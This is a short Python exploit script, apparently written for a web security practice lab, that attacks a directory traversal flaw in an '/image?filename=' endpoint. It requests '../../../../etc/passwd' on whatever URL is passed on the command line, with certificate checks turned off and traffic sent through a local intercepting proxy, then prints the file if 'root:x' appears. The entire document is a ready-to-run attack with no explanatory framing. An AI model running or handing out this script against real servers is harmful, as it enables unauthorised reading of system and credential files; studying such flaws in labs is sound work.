import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def directory_taversal_exploit(url):
    image_url = url+'/image?filename=../../../../etc/passwd'
    re = requests.get(image_url, verify=False,proxies=proxies)
    if 'root:x' in re.text:
        print('(+) Exploit successfull....')
        print('(+) The content of the root are...')
        print('\n'+ re.text)
    else:
        print('(+) Exploit unsuccessfull....')

def main():
    if len(sys.argv) != 2:
        print("(+) Usages: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Exploiting directory traversal vulnerability.....")
    directory_taversal_exploit(url)

if __name__ == "__main__":
    main()